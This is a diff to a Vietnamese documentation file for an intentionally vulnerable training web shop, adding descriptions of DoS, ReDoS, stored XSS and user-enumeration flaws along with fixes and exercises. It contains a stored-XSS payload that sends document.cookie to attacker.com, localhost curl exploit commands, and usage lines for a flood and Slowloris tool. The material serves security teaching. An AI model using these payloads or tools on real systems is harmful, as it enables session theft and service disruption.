@@ -1,8 +1,8 @@
 # 🔓 Danh Sách Lỗ Hổng Bảo Mật (Vulnerabilities)
 
-> **Mục đích**: Tài liệu này mô tả chi tiết 4 lỗ hổng bảo mật chính được tích hợp trong website Vulnerable Shop để phục vụ mục đích học tập và nghiên cứu về An toàn Thông tin.
+> **Mục đích**: Tài liệu này mô tả chi tiết 6 lỗ hổng bảo mật chính được tích hợp trong website Vulnerable Shop để phục vụ mục đích học tập và nghiên cứu về An toàn Thông tin.
 
-## 📋 Tổng Quan 4 Lỗ Hổng Chính
+## 📋 Tổng Quan 6 Lỗ Hổng Chính
 
 | # | Chức năng | Lỗ hổng | Mức độ | File |
 |---|-----------|---------|--------|------|
@@ -10,6 +10,8 @@
 | 2 | Tìm kiếm sản phẩm | SQL Injection | 🔴 Critical | `products.php` |
 | 3 | Quản lý đơn hàng | IDOR (Insecure Direct Object Reference) | 🟠 High | `order_detail.php` |
 | 4 | Quản lý sản phẩm | Data Validation Issues | 🟡 Medium | `admin/products_manage.php` |
+| 5 | Đánh giá sản phẩm | Stored XSS, User Enumeration | 🔴 Critical | `product_detail.php` |
+| 6 | Toàn hệ thống | Denial of Service (DoS) | 🟠 High | `products.php`, `dos_test.php` |
 
 ---
 
@@ -458,6 +460,68 @@ $stmt->execute();
 
 ---
 
+## ⚡ 5. LỖ HỔNG DENIAL OF SERVICE (DoS)
+
+### 📌 Tổng Quan
+**Chức năng**: Các endpoint xử lý dữ liệu lớn hoặc thuật toán phức tạp  
+**Files liên quan**: `products.php`, `dos_test.php`
+
+### 🚨 Rủi Ro A: Resource Exhaustion (Cạn kiệt tài nguyên)
+**Mức độ**: 🟠 High  
+**Vị trí**: `products.php` (tham số `limit`)
+
+#### Mô tả:
+- ❌ Không giới hạn giá trị của tham số `limit`.
+- ❌ Kẻ tấn công có thể yêu cầu hàng triệu bản ghi trong một request, làm treo Database hoặc tràn bộ nhớ PHP.
+
+#### Khai thác:
+```bash
+# Yêu cầu 1 triệu sản phẩm
+curl "http://localhost/vulnerable-shop/products.php?limit=1000000"
+```
+
+### 🚨 Rủi Ro B: ReDoS (Regular Expression DoS)
+**Mức độ**: 🟠 High  
+**Vị trí**: `dos_test.php`
+
+#### Mô tả:
+- ❌ Sử dụng Regex không tối ưu (Evil Regex) gây ra hiện tượng Catastrophic Backtracking.
+- ❌ Một chuỗi đầu vào nhỏ có thể khiến CPU server tăng vọt lên 100% và treo process.
+
+#### Khai thác:
+```bash
+# Gửi pattern gây backtracking
+curl "http://localhost/vulnerable-shop/dos_test.php?type=redos&pattern=(a+)+$"
+```
+
+---
+
+## 🛠️ CÔNG CỤ KIỂM THỬ DoS (dos_tool.js)
+
+Chúng tôi đã cung cấp một công cụ Node.js để tự động hóa việc kiểm thử các lỗ hổng DoS này.
+
+### Cách sử dụng:
+1. Đảm bảo đã cài đặt Node.js.
+2. Chạy lệnh:
+```bash
+# Xem hướng dẫn
+node dos_tool.js help
+
+# Test Resource Exhaustion
+node dos_tool.js limit http://localhost/vulnerable-shop
+
+# Test ReDoS
+node dos_tool.js redos http://localhost/vulnerable-shop
+
+# Test HTTP Flood (500 requests đồng thời)
+node dos_tool.js flood http://localhost/vulnerable-shop
+
+# Test Slowloris (Làm cạn kiệt connection pool của Apache)
+node dos_tool.js slowloris http://localhost/vulnerable-shop
+```
+
+---
+
 ## 📊 Bảng Tổng Hợp Cách Khắc Phục
 
 | Lỗ hổng | Giải pháp chính | Công nghệ/Kỹ thuật |
@@ -467,6 +531,44 @@ $stmt->execute();
 | **Plaintext Password** | Hash mật khẩu | `password_hash()`, bcrypt, Argon2 |
 | **IDOR** | Authorization Check | Session-based ownership validation |
 | **Data Validation** | Input Validation + Sanitization | `filter_var()`, `htmlspecialchars()`, Regex |
+| **DoS** | Rate Limiting + Input Limits | Cloudflare, `limit` validation, Regex optimization |
+
+---
+
+## 💬 5. LỖ HỔNG ĐÁNH GIÁ SẢN PHẨM
+
+### 📌 Tổng Quan
+**Chức năng**: Người dùng gửi nhận xét và đánh giá sao cho sản phẩm.  
+**Files liên quan**: `product_detail.php`  
+**Bảng database**: `reviews`
+
+### 🚨 Rủi Ro A: Stored Cross-Site Scripting (XSS)
+**Mức độ**: 🔴 Critical  
+**Vị trí**: `product_detail.php` (phần hiển thị comment)
+
+#### Mô tả lỗ hổng:
+- ❌ Dữ liệu từ người dùng (`comment`) được lưu vào database mà không qua kiểm duyệt.
+- ❌ Khi hiển thị, dữ liệu được in trực tiếp ra HTML mà không dùng `htmlspecialchars()`.
+
+#### Kịch bản tấn công:
+```html
+1. Attacker đăng nhập và gửi đánh giá với nội dung:
+   <script>alert('XSS!'); fetch('https://attacker.com/steal?cookie=' + document.cookie);</script>
+2. Bất kỳ người dùng nào (kể cả Admin) vào xem sản phẩm đó sẽ bị thực thi mã script.
+3. Attacker lấy được Session Cookie và chiếm quyền tài khoản.
+```
+
+### 🚨 Rủi Ro B: User Enumeration
+**Mức độ**: 🟡 Medium  
+**Vị trí**: `product_detail.php` (phần hiển thị tên người đánh giá)
+
+#### Mô tả lỗ hổng:
+- ❌ Hiển thị trực tiếp `username` (thường là ID đăng nhập) của người đánh giá.
+- ❌ Giúp attacker thu thập danh sách các username hợp lệ để thực hiện Brute Force.
+
+#### Impact:
+- ✅ Lộ thông tin định danh người dùng.
+- ✅ Tạo tiền đề cho các cuộc tấn công dò tìm mật khẩu.
 
 ---
 
@@ -505,6 +607,15 @@ Task: Fork project và khắc phục:
 2. Implement password hashing trong register.php
 3. Add IDOR protection trong order_detail.php
 4. Add input validation trong admin/products_manage.php
+```
+
+### Exercise 5: Denial of Service (DoS)
+```
+Task: 
+1. Sử dụng dos_tool.js để test endpoint products.php?limit=...
+2. Quan sát thời gian phản hồi khi tăng limit.
+3. Sử dụng dos_tool.js để test ReDoS.
+4. Đề xuất cách fix cho lỗ hổng limit trong products.php.
 ```
 
 ---
